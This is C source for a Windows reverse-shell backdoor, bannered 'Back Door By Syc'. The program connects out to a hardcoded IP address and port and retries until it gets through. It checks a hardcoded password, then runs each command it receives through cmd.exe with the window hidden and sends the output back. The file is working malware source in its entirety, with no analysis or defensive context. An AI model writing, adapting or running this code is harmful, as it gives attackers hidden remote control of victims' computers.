
#include "rspDoor.h"

BOOL bExit = FALSE;
#define RECV_BUF_LEN 4096
#define CMD_BUF_LEN 500
#define LOGON_PASSWORD _T("123456")

BOOL SocketInit()
{
	WSADATA wsaData = {0};
	if ( WSAStartup(MAKEWORD(2, 2), &wsaData) == NO_ERROR ) {
		return TRUE;
	}else{
		return FALSE;
	}
}

int SendData(SOCKET m_Sock, void *pBuf, DWORD dwBufLen)
{
	if ( m_Sock == INVALID_SOCKET || !pBuf || dwBufLen <= 0 ) {
		return -1;
	}
	int iCurrSend = 0, offset = 0;
	do {
		iCurrSend = send(m_Sock, (char *)pBuf+offset, dwBufLen, 0);
		if ( iCurrSend <= 0 ) {
			break;
		}
		dwBufLen -= iCurrSend;
		offset += iCurrSend;
	} while ( dwBufLen > 0 );
	return offset;
}

DWORD WINAPI ThreadOutputProc(LPVOID lpParam)
{
	CThreadNode tNode = *(CThreadNode *)lpParam;
	char szBuf[RECV_BUF_LEN] = {0};
	DWORD dwReadLen = 0, dwTotalAvail = 0;
	BOOL bRet = FALSE;
	while ( !bExit ) {
		dwTotalAvail = 0;
		bRet = PeekNamedPipe(tNode.hPipe, NULL, 0, NULL, &dwTotalAvail, NULL);
		if ( bRet && dwTotalAvail > 0 ) {
			bRet = ReadFile(tNode.hPipe, szBuf, RECV_BUF_LEN, &dwReadLen, NULL);
			if ( bRet && dwReadLen > 0 ) {
				SendData(tNode.m_Sock, szBuf, dwReadLen);
			}
		}
		Sleep(50);
	}
	return TRUE;
}

BOOL GetCmdString(SOCKET m_Sock, LPTSTR lpszCmdBuf)
{
	if ( m_Sock == INVALID_SOCKET || !lpszCmdBuf ) {
		return FALSE;
	}
	int iRet = 0;
	TCHAR sztBuf[2] = {0}, szCmdBuf[CMD_BUF_LEN] = {0};
	while ( TRUE ) {
		iRet = recv(m_Sock, sztBuf, 1, 0);
		if(iRet ==0 || iRet == SOCKET_ERROR) {
			return FALSE;
		}
		if( sztBuf[0] != '\r' && sztBuf[0] != '\n' ) {
			_tcscat_s(szCmdBuf, CMD_BUF_LEN, sztBuf);	
		}else{
			break;
		}
		Sleep(50);
	}
	if ( _tcslen(szCmdBuf) > 0 ) {
		_tcscpy_s(lpszCmdBuf, CMD_BUF_LEN, szCmdBuf);
	}
	return TRUE;
}

BOOL CheckPassword(SOCKET m_Sock)
{
	int iRecved = 0, iTimes = 2;
	TCHAR szBuf[2] = {0}, szCmdBuf[CMD_BUF_LEN] = {0};
	TCHAR szWelcome[] = _T("/====================Back Door By Syc=====================/\r\n\r\n");
	TCHAR szPass[] = _T("\r\n请输入密码，您有3次机会：");
	TCHAR szSucceed[] = _T("登陆成功！\r\n"), szFailed2[] = _T("密码错误，您还有2次机会，请重新输入密码："), szFailed1[] = _T("密码错误，您还有1次机会，请重新输入密码：");
	TCHAR szFailed[] = _T("密码错误，登陆失败！");
	if ( SendData(m_Sock, szPass, _tcslen(szPass)) > 0 ) {
		//Compare the password;
		while ( GetCmdString(m_Sock, szCmdBuf) ) {
			if ( _tcscmp(szCmdBuf, LOGON_PASSWORD) == 0 ) {
				SendData(m_Sock, szSucceed, _tcslen(szSucceed));
				SendData(m_Sock, szWelcome, _tcslen(szWelcome));
				return TRUE;
			}else if (iTimes == 2){
				SendData(m_Sock, szFailed2, _tcslen(szFailed2));
				--iTimes;
			}else if (iTimes == 1){
				SendData(m_Sock, szFailed1, _tcslen(szFailed1));
				--iTimes;
			}else if ( iTimes == 0 ) {
				SendData(m_Sock, szFailed, _tcslen(szFailed));
				break;
			}
		}
	}
	return FALSE;
}

BOOL StartShell(UINT uPort, LPCSTR lpszIpAddr)
{
	if ( !SocketInit() ) {
		return FALSE;
	}
	SOCKET m_ConnectSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if ( m_ConnectSock == INVALID_SOCKET ) {
		return FALSE;
	}

	sockaddr_in sServer = {0};
	sServer.sin_family = AF_INET;
	sServer.sin_addr.s_addr = inet_addr(lpszIpAddr);
	sServer.sin_port = htons(uPort);
	
	int iRet = 0;
	do {
		iRet = connect(m_ConnectSock, (sockaddr*)&sServer, sizeof(sServer));
	} while ( iRet == SOCKET_ERROR );

	if ( !CheckPassword(m_ConnectSock) ) {
		goto __Error_End;
	}

	//Ready for the pipe;
	SECURITY_ATTRIBUTES sa = {0};
	HANDLE hReadPipe = NULL, hWritePipe = NULL;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	if ( !CreatePipe(&hReadPipe, &hWritePipe, &sa, 0) ) {
		return FALSE;
	}
	
	//Ready for the CreateProcess function;
	PROCESS_INFORMATION pi = {0};
	STARTUPINFO si = {0};
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.hStdOutput = si.hStdError = hWritePipe;
	si.wShowWindow = SW_HIDE;

	//Ready for the CreateThread function;
	DWORD dwThreadID = 0;
	CThreadNode m_ReadNode;
	m_ReadNode.m_Sock = m_ConnectSock;
	m_ReadNode.hPipe = hReadPipe;
	HANDLE hThread = CreateThread(NULL, 0, ThreadOutputProc, &m_ReadNode, 0, &dwThreadID);

	int iRecved = 0;
	TCHAR szCmdLine[CMD_BUF_LEN] = {0}, szCmdBuf[CMD_BUF_LEN] = {0};
	while( GetCmdString(m_ConnectSock, szCmdBuf )){
		if ( _tcslen(szCmdBuf) > 0 ) {
			if ( _tcsicmp(szCmdBuf, _T("exit")) == 0 ) {
				break;
			}
			ZeroMemory(szCmdLine, CMD_BUF_LEN);
			GetSystemDirectory(szCmdLine, CMD_BUF_LEN);
			_tcscat_s(szCmdLine, CMD_BUF_LEN, _T("\\cmd.exe /c "));
			_tcscat_s(szCmdLine, CMD_BUF_LEN, szCmdBuf);
			CreateProcess(NULL, szCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
		}
		Sleep(50);
	}
	closesocket(m_ConnectSock);
	m_ConnectSock = INVALID_SOCKET;
	bExit = TRUE;
	WaitForSingleObject(hThread, INFINITE);

__Error_End:
	if ( m_ConnectSock != INVALID_SOCKET ) {
		closesocket(m_ConnectSock);
	}
	WSACleanup();
	return TRUE;
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
					   HINSTANCE hPrevInstance,
					   LPTSTR    lpCmdLine,
					   int       nCmdShow)
{
	StartShell(9527, _T("192.168.0.2"));
	return 0;
}